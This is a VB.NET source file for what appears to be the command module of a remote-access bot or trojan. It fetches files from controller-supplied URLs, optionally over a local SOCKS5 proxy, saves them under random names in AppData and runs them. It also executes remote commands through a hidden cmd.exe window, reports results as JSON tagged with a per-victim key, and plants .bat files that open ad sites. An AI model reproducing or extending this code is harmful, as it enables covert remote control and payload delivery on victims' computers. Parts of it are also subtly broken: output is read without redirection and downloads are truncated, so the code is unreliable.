
Imports System.IO
Imports System.Net
Imports System.Threading
Imports System.Windows.Forms
Imports com.LandonKey.SocksWebProxy
Imports Newtonsoft.Json

Public Class ExecuteCommand : Implements ICommand
    Public Shared Function Handler(ByVal model As ExecuteModel)
        Try
            Dim r As Random = New Random
            Dim newlocation As String = GetAppdata() & "\" & r.Next(0, 99999) & model.newExecute.Name
            Dim result As LogModel
            If Not IO.File.Exists(newlocation) Then
                If Not model.newExecute.Proxy Then
                    Dim download As WebClient = New WebClient()
                    download.DownloadFile(model.newExecute.Url, newlocation)
                Else
                    DownLoadFileByWebRequest(model.newExecute.Url, newlocation)
                End If
                Thread.Sleep(SectoMs(5))
                If model.newExecute.Run Then
                    result = Running(newlocation, model)
                Else
                    result = New LogModel With {
                            .Message = "File successfully Download!",
                            .Type = "Success",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
                End If

                Return JsonConvert.SerializeObject(result)
            End If
            result = New LogModel With {
                .Message = "File already exist please try again!",
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
            }
            Return JsonConvert.SerializeObject(result)
        Catch ex As Exception
            Dim result As New LogModel With {
                .Message = ex.ToString,
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
                }
            Return JsonConvert.SerializeObject(result)
        End Try
    End Function
    Public Shared Function Running(ByVal path As String, ByVal model As ExecuteModel) As LogModel
        Try
            If File.Exists(path) Then
                Process.Start(path)
                Return New LogModel With {
                            .Message = "File successfully executed!",
                            .Type = "Success",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
            Else
                Return New LogModel With {
                            .Message = "File Not found execute unsuccesfully!",
                            .Type = "Error",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
            End If

        Catch ex As Exception
            Return New LogModel With {
                .Message = ex.ToString,
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
                }
        End Try
    End Function
    Private Shared Sub DownLoadFileByWebRequest(ByVal urlAddress As String, ByVal filePath As String)
        Try
            Dim request As Net.HttpWebRequest = Nothing
            Dim response As Net.HttpWebResponse = Nothing
            Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
            request = CType(WebRequest.Create(urlAddress), HttpWebRequest)
            request.Proxy = New SocksWebProxy(socket5)
            request.Timeout = 30000
            request.Method = "GET"
            request.KeepAlive = True
            response = CType(request.GetResponse(), Net.HttpWebResponse)
            Dim s As Stream = response.GetResponseStream()

            If File.Exists(filePath) Then
                File.Delete(filePath)
            End If

            Dim inBuf As Byte() = New Byte(99999) {}
            Dim bytesToRead As Integer = CInt(inBuf.Length)
            Dim bytesRead As Integer = 0

            While bytesToRead > 0
                Dim n As Integer = s.Read(inBuf, bytesRead, bytesToRead)
                If n = 0 Then Exit While
                bytesRead += n
                bytesToRead -= n
            End While
            Dim fstr As FileStream = New FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write)
            fstr.Write(inBuf, 0, bytesRead)
            s.Close()
            fstr.Close()
        Catch
            Return
        Finally
        End Try
    End Sub
    Public Shared Function ExecuteCMD(ByVal model As CMDModel)
        Dim Process As New Process()
        Process.StartInfo.FileName = "cmd.exe"
        Process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        Process.StartInfo.CreateNoWindow = True
        Process.StartInfo.UseShellExecute = False
        Process.StartInfo.Arguments = model.newVariables.command
        Process.Start()
        Dim log As New LogModel
        Return New LogModel With {
                .Message = Process.StandardOutput.ReadToEnd(),
                .Type = "Success",
                .KeyUnique = GetConfigJson().KeyUnique
                }
    End Function
    Public Shared Function AddAds(ByVal model As AdsModel)
        Dim url As String = model.newVariables.Url
        Dim website As String = model.newVariables.Url
        If url.Contains("http://") Then url = url.Replace("http://", String.Empty)
        If url.Contains("www.") Then url = url.Replace("www.", String.Empty)
        If url.Contains("/") Then url = url.Replace("/", String.Empty)
        IOModule.Write_file(Application.StartupPath() & "/" & url & ".bat", "Start " & website)
        Return New LogModel With {
                .Message = "Saved ad",
                .Type = "Success",
                .KeyUnique = GetConfigJson().KeyUnique
                }
    End Function
End Class
